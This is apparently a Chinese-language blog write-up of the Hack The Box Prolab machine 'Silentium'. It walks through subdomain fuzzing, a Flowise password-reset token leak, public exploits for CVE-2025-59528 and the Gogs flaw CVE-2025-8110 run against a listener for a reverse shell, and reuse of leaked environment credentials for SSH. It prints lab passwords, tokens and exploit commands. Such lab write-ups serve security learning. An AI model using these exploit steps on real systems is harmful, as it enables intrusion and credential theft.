---
title: Silentium
date: 2026-09-07 14:31:33
categories:
  - prolabs
tags:
  - HTB
  - Prolab
  - Silentium
  - 内网渗透
---

## 信息收集

先nmap扫一遍

![image-20260907095534802](/images/prolabs/silentium/20260907095542011.png)

访问80端口

![image-20260907095935284](/images/prolabs/silentium/20260907095935478.png)

Silentium 是一家金融机构，为全球符合条件的交易方提供结构化贷款、私人信贷以及定制化的资本解决方案。

先扫一波子域名fuff测试

```shell
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb"  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```

![image-20260907100534015](/images/prolabs/silentium/20260907100534151.png)

staging.silentium.htb

配置到我们的/etc/hosts中

![image-20260907101026317](/images/prolabs/silentium/20260907101026554.png)

成功访问

## 开始侦察

![image-20260907101403284](/images/prolabs/silentium/20260907101403371.png)

先抓个包

在`http://silentium.htb/#team`可以看到有个 Ben 用户名

随便输入个`admin@silentium.htb`，回显的是 404

![image-20260907102512494](/images/prolabs/silentium/20260907102512706.png)

如输入ben@silentium.htb 返回的就是401

![image-20260907102649374](/images/prolabs/silentium/20260907102649424.png)

说明资源是存在的，知识我没有身份凭证访问。需要登陆认证

看看能不能改密码，这里有个忘记密码的功能

输入邮箱，发包得到token

![](/images/prolabs/silentium/20260907103130878.png)

```
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"l3GzH0h8JTR5zYwPrSEiH4E68OfhGPU9xc1YlPy6fc2RmmzTV9pbWNBm7pPFDYG8","tokenExpiry":"2026-09-07T02:54:13.893Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-07T02:39:13.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

l3GzH0h8JTR5zYwPrSEiH4E68OfhGPU9xc1YlPy6fc2RmmzTV9pbWNBm7pPFDYG8

更改密码

![image-20260907104134311](/images/prolabs/silentium/20260907104134388.png)

登录后台

![image-20260907104453658](/images/prolabs/silentium/20260907104453758.png)

找找有没有历史性cve

Flowise 是开源的低代码/无代码工具，帮助用户快速构建和部署基于大语言模型（LLM）的应用程序。通过可视化界面，让用户以拖拽的方式轻松搭建复杂的工作流，无需编写大量代码。Flowise 支持多种主流大语言模型，如 OpenAI 的 GPT 系列和 Hugging Face 模型，同时提供丰富的预置组件，满足不同场景的需求

##  漏洞利用(CVE-2025-59528)

```kotlin
git clone https://github.com/AzureADTrent/CVE-2025-58434-59528.git
```

可以看到登录后能在`http://staging.silentium.htb/apikey`获取到 apikey

![image-20260907105614200](/images/prolabs/silentium/20260907105614454.png)

```
hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc

```

```shell
python3 flowise_chain.py -t http://staging.silentium.htb/ -e ben@silentium.htb
```

## rce

![image-20260907110343466](/images/prolabs/silentium/20260907110343643.png)

拿到shell啦

![image-20260907110403359](/images/prolabs/silentium/20260907110403396.png)

接着进行信息收集

发现是root权限，但是是在docker环境下

![image-20260907110611614](/images/prolabs/silentium/20260907110611717.png)

查看env，发现密码

```shell
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test

```

SMTP_PASSWORD=r04D!!_R4ge

尝试22连接上去

```
ssh ben@10.129.35.203
```

![image-20260907111257426](/images/prolabs/silentium/20260907111257628.png)

拿下第一个flag

## 提权

尝试提权，SUID 和 SUDO 都没有，查看网络服务

```shell
netstat -tulpn
```

![image-20260907112008040](/images/prolabs/silentium/20260907112008171.png)

有个3001端口，我们进行全流代理

```
ssh -L 3001:127.0.0.1:3001 ben@10.129.35.203 
```

接着访问3001端口

![image-20260907112744969](/images/prolabs/silentium/20260907112745153.png)

是 Gogs 服务，找历史漏洞和POC

注册一个看看

![image-20260907140933744](/images/prolabs/silentium/20260907140934017.png)

[CVE-2025-8110 Gogs远程命令注入漏洞绕过分析与复现-先知社区](https://xz.aliyun.com/news/90842)

可以找到：CVE-2025-8110

```shell
git clone https://github.com/Ghxstsec/CVE-2025-8110.git
```

脚本要改一下username 和 token

![image-20260907141219551](/images/prolabs/silentium/20260907141219679.png)

```
roxci
6cfb2be17a3ab62620df1762152befbc721f2684
```

![image-20260907142243705](/images/prolabs/silentium/20260907142243888.png)

```
python3 CVE-2025-8110-RCE.py -u http://127.0.0.1:3001 -lh 10.10.16.85 -lp 8000 -p '123qazCrx@'
```

![image-20260907142926460](/images/prolabs/silentium/20260907142926545.png)

成功提权

![image-20260907143054612](/images/prolabs/silentium/20260907143054681.png)
